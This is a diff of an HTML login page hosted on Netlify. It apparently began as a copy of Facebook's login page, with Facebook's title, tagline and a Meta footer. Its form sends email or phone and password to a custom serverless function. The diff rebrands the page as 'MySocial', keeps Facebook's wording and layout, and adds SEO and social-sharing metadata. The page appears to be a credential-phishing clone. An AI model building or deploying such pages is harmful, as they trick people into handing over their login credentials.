@@ -3,36 +3,82 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Facebook – Log In</title>
-  <!-- Optional CSS if you have a styles.css file -->
+  
+  <title>MySocial – Log In</title>
+
+  <!-- SEO Meta Tags -->
+  <meta name="description" content="Log in to MySocial to connect and share with people in your life.">
+  <meta name="keywords" content="social media, login, MySocial, friends, connect, chat, share">
+  <meta name="robots" content="index, follow">
+
+  <!-- Open Graph (for Facebook sharing) -->
+  <meta property="og:title" content="MySocial – Log In">
+  <meta property="og:description" content="Log in to MySocial to connect and share with people in your life.">
+  <meta property="og:image" content="https://harmonious-mooncake-91f654.netlify.app/social-preview.jpg">
+  <meta property="og:url" content="https://harmonious-mooncake-91f654.netlify.app/">
+  <meta property="og:type" content="website">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="MySocial – Log In">
+  <meta name="twitter:description" content="Log in to MySocial to connect and share with people in your life.">
+  <meta name="twitter:image" content="https://harmonious-mooncake-91f654.netlify.app/social-preview.jpg">
+
+  <!-- Favicon -->
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
+
+  <!-- Optional CSS -->
   <link rel="stylesheet" href="styles.css" />
+
+  <!-- Structured Data (Schema.org) -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebSite",
+    "name": "MySocial",
+    "url": "https://harmonious-mooncake-91f654.netlify.app/",
+    "description": "Log in to MySocial to connect and share with people in your life.",
+    "potentialAction": {
+      "@type": "SearchAction",
+      "target": "https://harmonious-mooncake-91f654.netlify.app/search?q={search_term_string}",
+      "query-input": "required name=search_term_string"
+    }
+  }
+  </script>
+
 </head>
 <body>
   <div class="container">
     <div class="login-box">
-      <h1 class="logo">Facebook</h1>
+      <h1 class="logo">MySocial</h1>
       <p class="subtitle">
-        Facebook helps you connect and share with the people in your life.
+        MySocial helps you connect and share with the people in your life.
       </p>
       
-      <!-- IMPORTANT: The form points to our Netlify Function -->
+      <!-- Form submission -->
       <form 
         name="login" 
         method="POST" 
         action="/.netlify/functions/submit"
       >
+        <label for="username">Email address or phone number</label>
         <input 
           type="text" 
+          id="username"
           name="username" 
           placeholder="Email address or phone number" 
           required
         />
+        
+        <label for="password">Password</label>
         <input 
           type="password" 
+          id="password"
           name="password" 
           placeholder="Password" 
           required
         />
+        
         <button type="submit" class="login-btn">Log in</button>
         <a href="#" class="forgot">Forgotten password?</a>
         <hr />
@@ -53,8 +99,8 @@
         <li>हिन्दी</li>
         <li>日本語</li>
       </ul>
-      <p>Meta © 2025</p>
+      <p>MySocial © 2025</p>
     </footer>
   </div>
 </body>
-</html>
+  </html>
